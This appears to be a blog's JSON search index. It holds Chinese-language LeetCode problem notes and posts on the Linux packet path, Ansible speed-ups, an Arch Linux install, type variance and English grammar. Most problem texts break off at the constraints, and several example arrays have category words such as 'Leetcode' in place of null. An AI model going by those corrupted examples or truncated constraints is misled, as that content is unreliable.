= {5, 6, 2, 0}Example 2:Input: nums = [0,1,2]Output: 1 Constraints:1 ","categories":["Algorithm","Leetcode"],"tags":["Array","Depth-First Search"]},{"title":"leetcode-598 - Range Addition II","url":"/2021/09/leetcode-598/","content":"動機\n都是從原點出發\n\nProblem\nYou are given an m x n matrix M initialized with all 0's and an array of operations ops, where ops[i] = [ai, bi] means M[x][y] should be incremented by one for all 0 ","categories":["Algorithm","Leetcode"],"tags":["Array","Math"]},{"title":"leetcode-633 - Sum of Square Numbers","url":"/2021/09/leetcode-633/","content":"動機\n就開根號\n\nProblem\nGiven a non-negative integer c, decide whether there're two integers a and b such that a2 + b2 = c. Example 1:Input: c = 5Output: trueExplanation: 1 * 1 + 2 * 2 = 5Example 2:Input: c = 3Output: falseExample 3:Input: c = 4Output: trueExample 4:Input: c = 2Output: trueExample 5:Input: c = 1Output: true Constraints:0 ","categories":["Algorithm","Leetcode"],"tags":["Math","Two Pointers","Binary Search"]},{"title":"leetcode-645 - Set Mismatch","url":"/2021/09/leetcode-645/","content":"動機\n水，但好像可以用數學解，但我看不懂\n\nProblem\nYou have a set of integers s, which originally contains all the numbers from 1 to n. Unfortunately, due to some error, one of the numbers in s got duplicated to another number in the set, which results in repetition of one number and loss of another number.You are given an integer array nums representing the data status of this set after the error.Find the number that occurs twice and the number that is missing and return them in the form of an array. Example 1:Input: nums = [1,2,2,4]Output: [2,3]Example 2:Input: nums = [1,1]Output: [1,2] Constraints:2 ","categories":["Algorithm","Leetcode"],"tags":["Array","Bit Manipulation","Hash Table","Sorting"]},{"title":"leetcode-652 - Find Duplicate Subtrees","url":"/2021/09/leetcode-652/","content":"動機\nstring as symbol!!\n\nProblem\nGiven the root of a binary tree, return all duplicate subtrees.For each kind of duplicate subtrees, you only need to return the root node of any one of them.Two trees are duplicate if they have the same structure with the same node values. Example 1:Input: root = [1,2,3,4,Leetcode,2,4,null,null,4]Output: [[2,4],[4]]Example 2:Input: root = [2,1,1]Output: [[1]]Example 3:Input: root = [2,2,2,3,null,3,null]Output: [[2,3],[3]] Constraints:The number of the nodes in the tree will be in the range [1, 10^4]-200 ","categories":["Algorithm","Leetcode"],"tags":["Breadth-First Search","Depth-First Search","Binary Tree","Tree"]},{"title":"leetcode-659 - Split Array into Consecutive Subsequences","url":"/2021/09/leetcode-659/","content":"動機\n跟patch array一樣很有魔法的題目\n\nProblem\nYou are given an integer array nums that is sorted in non-decreasing order.Determine if it is possible to split nums into one or more subsequences such that both of the following conditions are true:Each subsequence is a consecutive increasing sequence (i.e. each integer is exactly one more than the previous integer).All subsequences have a length of 3 or more.Return true if you can split nums according to the above conditions, or false otherwise.A subsequence of an array is a new array that is formed from the original array by deleting some (can be none) of the elements without disturbing the relative positions of the remaining elements. (i.e., [1,3,5] is a subsequence of [1,2,3,4,5] while [1,3,2] is not). Example 1:Input: nums = [1,2,3,3,4,5]Output: trueExplanation: nums can be split into the following subsequences:[1,2,3,3,4,5] --> 1, 2, 3[1,2,3,3,4,5] --> 3, 4, 5Example 2:Input: nums = [1,2,3,3,4,4,5,5]Output: trueExplanation: nums can be split into the following subsequences:[1,2,3,3,4,4,5,5] --> 1, 2, 3, 4, 5[1,2,3,3,4,4,5,5] --> 3, 4, 5Example 3:Input: nums = [1,2,3,4,4,5]Output: falseExplanation: It is impossible to split nums into consecutive increasing subsequences of length 3 or more. Constraints:1 ","categories":["Algorithm","Leetcode"],"tags":["Array","Heap (Priority Queue)","Greedy","Hash Table"]},{"title":"leetcode-701 - Insert into a Binary Search Tree","url":"/2021/09/leetcode-701/","content":"動機\n用rebuild的思維\n\nProblem\nYou are given the root node of a binary search tree (BST) and a value to insert into the tree. Return the root node of the BST after the insertion. It is guaranteed that the new value does not exist in the original BST.Notice that there may exist multiple valid ways for the insertion, as long as the tree remains a BST after insertion. You can return any of them. Example 1:Input: root = [4,2,7,1,3], val = 5Output: [4,2,7,1,3,5]Explanation: Another accepted tree is:Example 2:Input: root = [40,20,60,10,30,50,70], val = 25Output: [40,20,60,10,30,50,70,Leetcode,null,25]Example 3:Input: root = [4,2,7,1,3,null,null,null,null,null,null], val = 5Output: [4,2,7,1,3,5] Constraints:The number of nodes in the tree will be in the range [0, 104].-108 ","categories":["Algorithm","Leetcode"],"tags":["Binary Tree","Tree","Binary Search Tree"]},{"title":"leetcode-710 - Random Pick with Blacklist","url":"/2021/09/leetcode-710/","content":"動機\nrandom題都很奇妙\n\nProblem\nYou are given an integer n and an array of unique integers blacklist. Design an algorithm to pick a random integer in the range [0, n - 1] that is not in blacklist. Any integer that is in the mentioned range and not in blacklist should be equally likely returned.Optimize your algorithm such that it minimizes the call to the built-in random function of your language.Implement the Solution class:Solution(int n, int[] blacklist) Initializes the object with the integer n and the blacklisted integers blacklist.int pick() Returns a random integer in the range [0, n - 1] and not in blacklist. All the possible integers should be equally likely returned. Example 1:Input[\"Solution\", \"pick\", \"pick\", \"pick\", \"pick\", \"pick\", \"pick\", \"pick\"][[7, [2, 3, 5]], [], [], [], [], [], [], []]Output[Algorithm, Leetcode, 6, 4, 1, 6, 1, 6, 4]ExplanationSolution solution = new Solution(7, [2, 3, 5]);solution.pick(); // return 6, any integer from [1,4,6] should be ok. Note that for every call of pick, 1, 4, and 6 must be equally likely to be returned (i.e., with probability 1/3).solution.pick(); // return 4solution.pick(); // return 1solution.pick(); // return 6solution.pick(); // return 1solution.pick(); // return 6solution.pick(); // return 4 Constraints:1 ","categories":["Algorithm","Leetcode"],"tags":["Math","Binary Search","Hash Table","Sorting","Randomized"]},{"title":"leetcode-752 - Open the Lock","url":"/2021/09/leetcode-752/","content":"動機\n就是BFS\n\nProblem\nYou have a lock in front of you with 4 circular wheels. Each wheel has 10 slots: '0', '1', '2', '3', '4', '5', '6', '7', '8', '9'. The wheels can rotate freely and wrap around: for example we can turn '9' to be '0', or '0' to be '9'. Each move consists of turning one wheel one slot.The lock initially starts at '0000', a string representing the state of the 4 wheels.You are given a list of deadends dead ends, meaning if the lock displays any of these codes, the wheels of the lock will stop turning and you will be unable to open it.Given a target representing the value of the wheels that will unlock the lock, return the minimum total number of turns required to open the lock, or -1 if it is impossible. Example 1:Input: deadends = [\"0201\",\"0101\",\"0102\",\"1212\",\"2002\"], target = \"0202\"Output: 6Explanation:A sequence of valid moves would be \"0000\" -> \"1000\" -> \"1100\" -> \"1200\" -> \"1201\" -> \"1202\" -> \"0202\".Note that a sequence like \"0000\" -> \"0001\" -> \"0002\" -> \"0102\" -> \"0202\" would be invalid,because the wheels of the lock become stuck after the display becomes the dead end \"0102\".Example 2:Input: deadends = [\"8888\"], target = \"0009\"Output: 1Explanation:We can turn the last wheel in reverse to move from \"0000\" -> \"0009\".Example 3:Input: deadends = [\"8887\",\"8889\",\"8878\",\"8898\",\"8788\",\"8988\",\"7888\",\"9888\"], target = \"8888\"Output: -1Explanation:We can't reach the target without getting stuck.Example 4:Input: deadends = [\"0000\"], target = \"8888\"Output: -1 Constraints:1 ","categories":["Algorithm","Leetcode"],"tags":["String","Array","Breadth-First Search","Hash Table"]},{"title":"leetcode-764 - Largest Plus Sign","url":"/2021/09/leetcode-764/","content":"動機\ntop-down只過了第一次，之後就過不了了\n\nProblem\nYou are given an integer n. You have an n x n binary grid grid with all values initially 1's except for some indices given in the array mines. The ith element of the array mines is defined as mines[i] = [xi, yi] where grid[xi][yi] == 0.Return the order of the largest axis-aligned plus sign of 1's contained in grid. If there is none, return 0.An axis-aligned plus sign of 1's of order k has some center grid[r][c] == 1 along with four arms of length k - 1 going up, down, left, and right, and made of 1's. Note that there could be 0's or 1's beyond the arms of the plus sign, only the relevant area of the plus sign is checked for 1's. Example 1:Input: n = 5, mines = [[4,2]]Output: 2Explanation: In the above grid, the largest plus sign can only be of order 2. One of them is shown.Example 2:Input: n = 1, mines = [[0,0]]Output: 0Explanation: There is no plus sign, so return 0. Constraints:1 ","categories":["Algorithm","Leetcode"],"tags":["Dynamic Programming","Array"]},{"title":"leetcode-793 - Preimage Size of Factorial Zeroes Function","url":"/2021/09/leetcode-793/","content":"動機\n也是有魔法的一題\n\n階乘中5的數量怎麼找?\n\n\nProblem\nLet f(x) be the number of zeroes at the end of x!. Recall that x! = 1 * 2 * 3 * ... * x and by convention, 0! = 1.For example, f(3) = 0 because 3! = 6 has no zeroes at the end, while f(11) = 2 because 11! = 39916800 has two zeroes at the end.Given an integer k, return the number of non-negative integers x have the property that f(x) = k. Example 1:Input: k = 0Output: 5Explanation: 0!, 1!, 2!, 3!, and 4! end with k = 0 zeroes.Example 2:Input: k = 5Output: 0Explanation: There is no x such that x! ends in k = 5 zeroes.Example 3:Input: k = 3Output: 5 Constraints:0 ","categories":["Algorithm","Leetcode"],"tags":["Math","Binary Search"]},{"title":"leetcode-797 - All Paths From Source to Target","url":"/2021/09/leetcode-797/","content":"動機\n就dfs，同時因為是dag所以不用處理cycle\n\nProblem\nGiven a directed acyclic graph (DAG) of n nodes labeled from 0 to n - 1, find all possible paths from node 0 to node n - 1 and return them in any order.The graph is given as follows: graph[i] is a list of all nodes you can visit from node i (i.e., there is a directed edge from node i to node graph[i][j]). Example 1:Input: graph = [[1,2],[3],[3],[]]Output: [[0,1,3],[0,2,3]]Explanation: There are two paths: 0 -> 1 -> 3 and 0 -> 2 -> 3.Example 2:Input: graph = [[4,3,1],[3,2,4],[3],[4],[]]Output: [[0,4],[0,3,4],[0,1,3,4],[0,1,2,3,4],[0,1,4]]Example 3:Input: graph = [[1],[]]Output: [[0,1]]Example 4:Input: graph = [[1,2,3],[2],[3],[]]Output: [[0,1,2,3],[0,2,3],[0,3]]Example 5:Input: graph = [[1,3],[2],[3],[]]Output: [[0,1,2,3],[0,3]] Constraints:n == graph.length2 ","categories":["Algorithm","Leetcode"],"tags":["Breadth-First Search","Depth-First Search","Backtracking","Graph"]},{"title":"leetcode-801 - Minimum Swaps To Make Sequences Increasing","url":"/2021/09/leetcode-801/","content":"動機\n這個真的想不到!!\n\n用dp紀錄狀態\n從dp(swap)找出另一個dp(fix)\n\n\nProblem\nYou are given two integer arrays of the same length nums1 and nums2. In one operation, you are allowed to swap nums1[i] with nums2[i].For example, if nums1 = [1,2,3,8], and nums2 = [5,6,7,4], you can swap the element at i = 3 to obtain nums1 = [1,2,3,4] and nums2 = [5,6,7,8].Return the minimum number of needed operations to make nums1 and nums2 strictly increasing. The test cases are generated so that the given input always makes it possible.An array arr is strictly increasing if and only if arr[0] < arr[1] < arr[2] < ... < arr[arr.length - 1]. Example 1:Input: nums1 = [1,3,5,4], nums2 = [1,2,3,7]Output: 1Explanation: Swap nums1[3] and nums2[3]. Then the sequences are:nums1 = [1, 3, 5, 7] and nums2 = [1, 2, 3, 4]which are both strictly increasing.Example 2:Input: nums1 = [0,3,5,8,9], nums2 = [2,1,4,6,9]Output: 1 Constraints:2 ","categories":["Algorithm","Leetcode"],"tags":["Dynamic Programming","Array"]},{"title":"leetcode-834 - Sum of Distances in Tree","url":"/2021/09/leetcode-834/","content":"動機\n看解答推導看不懂，看lee215一下就懂了，真是神!!\n另外這題很漂亮、很美!!\n\nProblem\nThere is an undirected connected tree with n nodes labeled from 0 to n - 1 and n - 1 edges.You are given the integer n and the array edges where edges[i] = [ai, bi] indicates that there is an edge between nodes ai and bi in the tree.Return an array answer of length n where answer[i] is the sum of the distances between the ith node in the tree and all other nodes. Example 1:Input: n = 6, edges = [[0,1],[0,2],[2,3],[2,4],[2,5]]Output: [8,12,6,10,10,10]Explanation: The tree is shown above.We can see that dist(0,1) + dist(0,2) + dist(0,3) + dist(0,4) + dist(0,5)equals 1 + 1 + 2 + 2 + 2 = 8.Hence, answer[0] = 8, and so on.Example 2:Input: n = 1, edges = []Output: [0]Example 3:Input: n = 2, edges = [[1,0]]Output: [1,1] Constraints:1 ","categories":["Algorithm","Leetcode"],"tags":["Dynamic Programming","Depth-First Search","Tree","Graph"]},{"title":"leetcode-848 - Shifting Letters","url":"/2021/09/leetcode-848/","content":"動機\nprefix sum但是從後面來\n\nProblem\nYou are given a string s of lowercase English letters and an integer array shifts of the same length.Call the shift() of a letter, the next letter in the alphabet, (wrapping around so that 'z' becomes 'a').For example, shift('a') = 'b', shift('t') = 'u', and shift('z') = 'a'.Now for each shifts[i] = x, we want to shift the first i + 1 letters of s, x times.Return the final string after all such shifts to s are applied. Example 1:Input: s = \"abc\", shifts = [3,5,9]Output: \"rpl\"Explanation: We start with \"abc\".After shifting the first 1 letters of s by 3, we have \"dbc\".After shifting the first 2 letters of s by 5, we have \"igc\".After shifting the first 3 letters of s by 9, we have \"rpl\", the answer.Example 2:Input: s = \"aaa\", shifts = [1,2,3]Output: \"gfd\" Constraints:1 ","categories":["Algorithm","Leetcode"],"tags":["String","Array"]},{"title":"leetcode-850 - Rectangle Area II","url":"/2021/09/leetcode-850/","content":"動機\n在你疑惑怎麼在x軸做linesweep時，lee215直接從y軸做離散化!!\n\nProblem\nWe are given a list of (axis-aligned) rectangles. Each rectangle[i] = [xi1, yi1, xi2, yi2] , where (xi1, yi1) are the coordinates of the bottom-left corner, and (xi2, yi2) are the coordinates of the top-right corner of the ith rectangle.Find the total area covered by all rectangles in the plane. Since the answer may be too large, return it modulo 109 + 7. Example 1:Input: rectangles = [[0,0,2,2],[1,0,2,3],[1,0,3,1]]Output: 6Explanation: As illustrated in the picture.Example 2:Input: rectangles = [[0,0,1000000000,1000000000]]Output: 49Explanation: The answer is 1018 modulo (109 + 7), which is (109)2 = (-7)2 = 49. Constraints:1 ","categories":["Algorithm","Leetcode"],"tags":["Array","Ordered Set","Segment Tree","Line Sweep"]},{"title":"leetcode-855 - Exam Room","url":"/2021/09/leetcode-855/","content":"動機\n就很直接，沒有什麼魔法\n\nProblem\nThere is an exam room with n seats in a single row labeled from 0 to n - 1.When a student enters the room, they must sit in the seat that maximizes the distance to the closest person. If there are multiple such seats, they sit in the seat with the lowest number. If no one is in the room, then the student sits at seat number 0.Design a class that simulates the mentioned exam room.Implement the ExamRoom class:ExamRoom(int n) Initializes the object of the exam room with the number of the seats n.int seat() Returns the label of the seat at which the next student will set.void leave(int p) Indicates that the student sitting at seat p will leave the room. It is guaranteed that there will be a student sitting at seat p. Example 1:Input[\"ExamRoom\", \"seat\", \"seat\", \"seat\", \"seat\", \"leave\", \"seat\"][[10], [], [], [], [], [4], []]Output[Algorithm, Leetcode, 0, 9, 4, 2, null, 5]ExplanationExamRoom examRoom = new ExamRoom(10);examRoom.seat(); // return 0, no one is in the room, then the student sits at seat number 0.examRoom.seat(); // return 9, the student sits at the last seat number 9.examRoom.seat(); // return 4, the student sits at the last seat number 4.examRoom.seat(); // return 2, the student sits at the last seat number 2.examRoom.leave(4);examRoom.seat(); // return 5, the student sits at the last seat number 5. Constraints:1 ","categories":["Algorithm","Leetcode"],"tags":["Design","Ordered Set"]},{"title":"leetcode-875 - Koko Eating Bananas","url":"/2021/09/leetcode-875/","content":"動機\n又是每次bsearch需要特別函數的類型\n\nProblem\nKoko loves to eat bananas. There are n piles of bananas, the ith pile has piles[i] bananas. The guards have gone and will come back in h hours.Koko can decide her bananas-per-hour eating speed of k. Each hour, she chooses some pile of bananas and eats k bananas from that pile. If the pile has less than k bananas, she eats all of them instead and will not eat any more bananas during this hour.Koko likes to eat slowly but still wants to finish eating all the bananas before the guards return.Return the minimum integer k such that she can eat all the bananas within h hours. Example 1:Input: piles = [3,6,7,11], h = 8Output: 4Example 2:Input: piles = [30,11,23,4,20], h = 5Output: 30Example 3:Input: piles = [30,11,23,4,20], h = 6Output: 23 Constraints:1 ","categories":["Algorithm","Leetcode"],"tags":["Array","Binary Search"]},{"title":"leetcode-887 - Super Egg Drop","url":"/2021/09/leetcode-887/","content":"動機\n有可以直接求的dp但是很難懂\n\nProblem\nYou are given k identical eggs and you have access to a building with n floors labeled from 1 to n.You know that there exists a floor f where 0 ","categories":["Algorithm","Leetcode"],"tags":["Dynamic Programming","Math","Binary Search"]},{"title":"leetcode-899 - Orderly Queue","url":"/2021/09/leetcode-899/","content":"動機\n這種找規律的真的好難，就像魔法一樣\n\nProblem\nYou are given a string s and an integer k. You can choose one of the first k letters of s and append it at the end of the string..Return the lexicographically smallest string you could have after applying the mentioned step any number of moves. Example 1:Input: s = \"cba\", k = 1Output: \"acb\"Explanation: In the first move, we move the 1st character 'c' to the end, obtaining the string \"bac\".In the second move, we move the 1st character 'b' to the end, obtaining the final result \"acb\".Example 2:Input: s = \"baaca\", k = 3Output: \"aaabc\"Explanation: In the first move, we move the 1st character 'b' to the end, obtaining the string \"aacab\".In the second move, we move the 3rd character 'c' to the end, obtaining the final result \"aaabc\". Constraints:1 ","categories":["Algorithm","Leetcode"],"tags":["String","Math","Sorting"]},{"title":"leetcode-962 - Maximum Width Ramp","url":"/2021/09/leetcode-962/","content":"動機\n\n我們要搜尋，所以一個要上升一個要下降\nlis與一個要上升一個要下降的關係是?\n\n\nProblem\nA ramp in an integer array nums is a pair (i, j) for which i < j and nums[i] ","categories":["Algorithm","Leetcode"],"tags":["Array","Stack","Monotonic Stack"]},{"title":"leetcode-969 - Pancake Sorting","url":"/2021/09/leetcode-969/","content":"動機\n模擬bubble sort\n\nProblem\nGiven an array of integers arr, sort the array by performing a series of pancake flips.In one pancake flip we do the following steps:Choose an integer k where 1 ","categories":["Algorithm","Leetcode"],"tags":["Array","Two Pointers","Greedy","Sorting"]},{"title":"leetcode-975 - Odd Even Jump","url":"/2021/09/leetcode-975/","content":"動機\nlee215，不用質疑的神\n\n用Monotonic Stack+sort求最小(大)的最近的index!!\n\n\nProblem\nYou are given an integer array arr. From some starting index, you can make a series of jumps. The (1st, 3rd, 5th, ...) jumps in the series are called odd-numbered jumps, and the (2nd, 4th, 6th, ...) jumps in the series are called even-numbered jumps. Note that the jumps are numbered, not the indices.You may jump forward from index i to index j (with i < j) in the following way:During odd-numbered jumps (i.e., jumps 1, 3, 5, ...), you jump to the index j such that arr[i] = arr[j] and arr[j] is the largest possible value. If there are multiple such indices j, you can only jump to the smallest such index j.It may be the case that for some index i, there are no legal jumps.A starting index is good if, starting from that index, you can reach the end of the array (index arr.length - 1) by jumping some number of times (possibly 0 or more than once).Return the number of good starting indices. Example 1:Input: arr = [10,13,12,14,15]Output: 2Explanation: From starting index i = 0, we can make our 1st jump to i = 2 (since arr[2] is the smallest among arr[1], arr[2], arr[3], arr[4] that is greater or equal to arr[0]), then we cannot jump any more.From starting index i = 1 and i = 2, we can make our 1st jump to i = 3, then we cannot jump any more.From starting index i = 3, we can make our 1st jump to i = 4, so we have reached the end.From starting index i = 4, we have reached the end already.In total, there are 2 different starting indices i = 3 and i = 4, where we can reach the end with some number ofjumps.Example 2:Input: arr = [2,3,1,1,4]Output: 3Explanation: From starting index i = 0, we make jumps to i = 1, i = 2, i = 3:During our 1st jump (odd-numbered), we first jump to i = 1 because arr[1] is the smallest value in [arr[1], arr[2], arr[3], arr[4]] that is greater than or equal to arr[0].During our 2nd jump (even-numbered), we jump from i = 1 to i = 2 because arr[2] is the largest value in [arr[2], arr[3], arr[4]] that is less than or equal to arr[1]. arr[3] is also the largest value, but 2 is a smaller index, so we can only jump to i = 2 and not i = 3During our 3rd jump (odd-numbered), we jump from i = 2 to i = 3 because arr[3] is the smallest value in [arr[3], arr[4]] that is greater than or equal to arr[2].We can't jump from i = 3 to i = 4, so the starting index i = 0 is not good.In a similar manner, we can deduce that:From starting index i = 1, we jump to i = 4, so we reach the end.From starting index i = 2, we jump to i = 3, and then we can't jump anymore.From starting index i = 3, we jump to i = 4, so we reach the end.From starting index i = 4, we are already at the end.In total, there are 3 different starting indices i = 1, i = 3, and i = 4, where we can reach the end with somenumber of jumps.Example 3:Input: arr = [5,1,3,4,2]Output: 3Explanation: We can reach the end from starting indices 1, 2, and 4. Constraints:1 ","categories":["Algorithm","Leetcode"],"tags":["Dynamic Programming","Array","Stack","Ordered Set","Monotonic Stack"]},{"title":"leetcode-990 - Satisfiability of Equality Equations","url":"/2021/09/leetcode-990/","content":"動機\n做兩遍union find!!\n\nProblem\nYou are given an array of strings equations that represent relationships between variables where each string equations[i] is of length 4 and takes one of two different forms: \"xi==yi\" or \"xi!=yi\".Here, xi and yi are lowercase letters (not necessarily different) that represent one-letter variable names.Return true if it is possible to assign integers to variable names so as to satisfy all the given equations, or false otherwise. Example 1:Input: equations = [\"a==b\",\"b!=a\"]Output: falseExplanation: If we assign say, a = 1 and b = 1, then the first equation is satisfied, but not the second.There is no way to assign the variables to satisfy both equations.Example 2:Input: equations = [\"b==a\",\"a==b\"]Output: trueExplanation: We could assign a = 1 and b = 1 to satisfy both equations.Example 3:Input: equations = [\"a==b\",\"b==c\",\"a==c\"]Output: trueExample 4:Input: equations = [\"a==b\",\"b!=c\",\"c==a\"]Output: falseExample 5:Input: equations = [\"c==c\",\"b==d\",\"x!=z\"]Output: true Constraints:1 ","categories":["Algorithm","Leetcode"],"tags":["String","Array","Union Find","Graph"]},{"title":"packet在linux中走過的路","url":"/2021/09/path-of-packet-in-linux/","content":"動機\n有趣的topic\n\npath of pkt: 從下到上\n總路線簡化版\n\n\nPHY\n\ndma 到 kernel ring buffer (1st copy)\nNic發signal\n\n\ndata link\n\nKernel handler到上半部處理\n\n註冊 device與下半部handler\n\n\n下半部\n\n取skb\n\n從ring buffer到qdisc\n\n\n\n決定往哪一個地方送 (bridge,ip)\n\n\n\n\nip\n\nIp 會照這圖先到preroute hook\n\n\n\n\nroute (from static, routing protocol, 自動生出來的)\n\n自己要收, output (local in與local out的hook)\nForward (forward的hook)\n\n\n往下之前看要不要切片\n把mac填好 (arp或是neighbour)\n\n\ntcp\n\n往上找有沒有開的socket\n\n往prequeue 塞\n等read，有就開始往userspace copy (2nd copy)\n\n\n沒有就drop\n\n\napp\n\nRead做recvform的syscall再根據socket類型往下找對應的recvform\n\n\n\nskb\n\nnetfilter與總路線\n\nlocalhost怎麼處理?\nlocalhost是到lo interface，也就是假網卡，data直接灌給自己\n有趣的是，只要是本機ip與localhost到本機ip與localhost，不論routing怎麼設，都是過4與3層到lo!!\nRef\nQueueing in the Linux Network Stack\nlinux network stack\nNetfilter-TaiwanWorkshop\nLinux Network Stack Walkthrough (2.4.20)\n环回接口(loopback interface)的新认识\n","categories":["Network","FAQ"]},{"title":"幫ansible加速!!","url":"/2021/10/ansible-speedup/","content":"動機\n最近常用，來整理一下\n\n一次裝很多app\n如果要裝就都放在name中\n- name: Install a list of packages  yum:    name:      - nginx      - postgresql      - postgresql-server    state: present\n盡量用module\n一般來說module可以在有重複時自動跳過，但有的時候module就是有bug，就沒辦法只能用command或是shell\ncommand與shell差在?\ncommand: 直接跑在/bin/sh\nshell: 看對面設定的shell是什麼\nStrategy\nStrategy就是在執行playbook時怎麼與其他主機協調\n\n一般是linear，會等大家都做完才會跑下一個\nfree，就是自己跑自己的\n加var到ansible.cfg\n[defaults]strategy = free\nforks\n如果主機很多就要一次多跑一點ansible，就要去調forks，預設只有5\n加var到ansible.cfg\n[defaults]forks=25\nAsync tasks\n一般來說ansible都會等對面的主機把task跑好，但有些task可以同時跑!!\n- name: Execute the long running script    shell:    &quot;chmod a+x /tmp/longrunningscript.sh &amp;&amp; /tmp/my-longrunning-script.sh 60&quot; # Run for 60 seconds     async: 120 # Maximum allowed time in Seconds    poll: 05 # Polling Interval in Seconds    - name: Some non dependent task I want to run even if the script is still running    yum:    name: httpd    state: present\nssh pipeline &amp; Mitogen\nssh pipeline\nansible提供的減少ssh通訊的方式\n\n加var到ansible.cfg 或是 ANSIBLE_PIPELINING=True\n\n[ssh_connection]pipelining = True\n\n確保對面的/etc/sudoers中沒有requiretty (據說不用了，但文件寫要)\n\nMitogen\n強大的IPC框架，ansible不用動，但還是有些要注意的\n\n載mitogen-0.2.9.tar.gz並unzip\n加var到ansible.cfg\n\n[defaults]strategy_plugins = /path/to/mitogen-0.2.9/ansible_mitogen/plugins/strategystrategy = mitogen_linear\ngather fact\ngather_facts很慢，能不用就不用\n- hosts: all  gather_facts: no  tasks:    - ping:\n不然就是同一台只跑一次 (cache fact)\n加var到ansible.cfg，把cache放到/tmp中\n[defaults]gathering = smartfact_caching = jsonfilefact_caching_connection = /tmp\nprofile\n在跑每個task時把花的時間print出來\n加var到ansible.cfg\n[defaults]callback_whitelist = profile_task\nRef\nHow to Speed Up Your Ansible Playbooks Over 600%\nHow to speed up Ansible playbooks drastically ?\n","categories":["Utils","Ansible"]},{"title":"arch linux的安裝更新","url":"/2021/10/arch-and-homed/","content":"動機\n這是更新上次安裝arch的流程\n\n用systemd-boot\n用systemd-networkd\n用systemd-homed\n用doas\n優化pacman\n\n\nsystemd-boot\n取代grub，預設裝在systemd中的bootloader\n詳細流程\n\n把/boot/創好\n裝arch\n\n\n之後/boot/中要有initrf與vmlinuz\n\n\nbootctl install\n放設定檔\n\n/boot/loader/loader.conf\ndefault archtimeout 0\n/boot/loader/entries/arch.conf\ntitle   Arch Linuxlinux   /vmlinuz-linuxinitrd  /initramfs-linux.imgoptions root=PARTUUID=[UUID] rw\nUUID用blkid -s PARTUUID -o value [path to arch root device]\nsystemd-networkd\n就是管網路的，但不太好用，想預設沒個網卡用dhcp要自己設定\n/etc/systemd/network/10-dhcp.network\n[Match]Name=*[Network]DHCP=Yes\nsystemd-homed\n創帳號很痛苦\n新的管帳號的方式，但很不方便\n\n在chroot時不能用systemd，所以沒辦法創帳號\n創帳號一定要密碼，但沒辦法用echo去給!!\n\n第一點目前沒想法，所以就等reboot後再創帳號\nhomectl create &#123;&#123; user_id &#125;&#125; --group=wheel --shell=/bin/zsh\n第二點在翻了homectl的source code發現有一個env可以放密碼!!\n&quot;NEWPASSWORD=&#123;&#123; user_pw &#125;&#125; homectl create &#123;&#123; user_id &#125;&#125; --group=wheel --shell=/bin/zsh\nssh沒有啟動的帳號\narch的wiki有解法\n\n在創帳號時紀錄sshd要去哪邊看authorized-keys\n\n\nNEWPASSWORD=&#123;&#123; user_pw &#125;&#125; homectl create &#123;&#123; user_id &#125;&#125; --group=wheel --shell=/bin/zsh --ssh-authorized-keys=@/home/authorized_keys\n\n\n改sshd_config\n之後登入都是用public key與password\n\nsshd_config\nAuthenticationMethods publickey,passwordAuthorizedKeysCommand /usr/bin/userdbctl ssh-authorized-keys %uAuthorizedKeysCommandUser rootPasswordAuthentication yes\nsu不給用\n另外還有一個是homed沒辦法直接su，這要改su的pam(原本只吃unix的account)\n/etc/pam.d/su-l\nauth        include         system-authaccount        include         system-authsession        include         system-authpassword        include         system-auth\ndoas\nsimple的sudo\ndoas conf\n/etc/doas.conf\npermit persist :wheel\n在wheel group可以用doas，同時在成功auth後一段時間不用打密碼\ndoas auto-complete\n~/.bashrc\ncomplete -cf doas\n優化pacman\nreflector怪怪的\n當初是用reflector直接掃，但是之後看出來的結果沒有最好的site，所以就直接用自己的吧\n另外，在安裝環境改的mirrorlist會直接影響到被安裝的mirrorlist。\n也就是只要copy一次，在chroot中不用再複製一次\nServer = http://free.nchc.org.tw/arch/$repo/os/$archServer = http://archlinux.cs.nctu.edu.tw/$repo/os/$archServer = http://shadow.ind.ntou.edu.tw/archlinux/$repo/os/$arch\npacman平行化\npacman一次只載一個，所以要改一下設定\n/etc/pacman.conf\n...ParallelDownloads = 10...","categories":["System","Linux","Tips"]},{"title":"共變數和反變數","url":"/2021/10/covariance/","content":"動機\n突然遇到的觀念，紀錄一下\n\nsubtype\nclass Animal : Dog\n畫成集合(Animal (Dog))\n在subtype，大的可以能容納小的\nCovariance\nCovariance指的是下面的可以成立，就是left hand side &gt; right hand side\nAnimal obj = new Dog()\nContravariance\n(Animal -&gt; void) f(Dog -&gt; void) gf = g # ??g = f # good\n有變數是一個函數只能吃Animal，Animal -&gt; void\n如果把Dog -&gt; void，assign過去之後，有人丟Animal就直接起飛\n因為明明是type decorator，卻讓看起來能容納的方向相反了!!\n原本的變數就是一個集合，但是這裡套的是一個函數\n函數是要求type，很像濾網，第一層type是Animal -&gt; void，會讓Animal都進來，但如果函數是Dog -&gt; void，就變成Animal放到Dog去，就一定報錯\n這就是Contravariance，就是left hand side &lt; right hand side\nCovariance &amp; Contravariance\n其實就是看是哪個接資料，大的可以能容納小的\nassign是left hand side去接資料\n函數上實際接資料的是函數，所以其實是right hand side接資料\n如果把函數的參數apply當成assign，所以就是看實際上在哪邊發生assign!!\n","categories":["PLT","Tips"]},{"title":"eng的文法範疇(也許?)","url":"/2021/10/eng-grammatical-categories/","content":"動機\n這是在重方法不重死背的英文文法(上)看到文法範疇概念與**《親愛的英文，我到底哪裡錯了**的個人整理\n\n文法範疇\n\n時態: 現在/過去 * 未來 * 完成式\n單複數 與 可數不可數:\n\n不可數\n\n單數 (整體)\n\nI love dogs (我愛狗)\nI love dog (我愛狗肉)\n\n\n\n\n可數\n\n單數\n複數 (整體)\n\n\n\n\n冠詞\n\n第一次\n\na/an\n\n可數單數\n\n\nsome\n\n不可數 或是 可數複數\n\n\n\n\n提過了\n\nthe\n\n\n\n\n及物不及物\n\n不及物: 本身就有意思\n\nI agree\nI agree on you\n\n\n及物: 一定要有受詞才會有意思\n\nI buy this meet\n\n\n\n\n感受&amp;引發\n\n感受\n\nboring\nscary\naddictive\n\n\n引發\n\nbored\nscared\naddicted\n\n\n\n\n介詞\n\nin: 包圍\n\n通常會是 小空間\n\n\non: 黏住、緊貼\n\n通常會是 廣大 的 平面\n\n\nat: 針對target，並在target附近\nto/for: 終點是 實體/抽象\nthrough/across: 穿過時 是被包圍的/在腳底下\nover: 越過(軌跡會是弧線、拋物線)\nby: 在target旁邊\n\nnext to(alongside): 在target旁邊，還是一排\n\n\nwith: 在target附近，且一起行動\nunder: 在下面\n\nunderneath: 在下面，還完全被蓋住\n\n\nalong: 在線的旁邊\n\n所以有 一起 與 沿著、順著 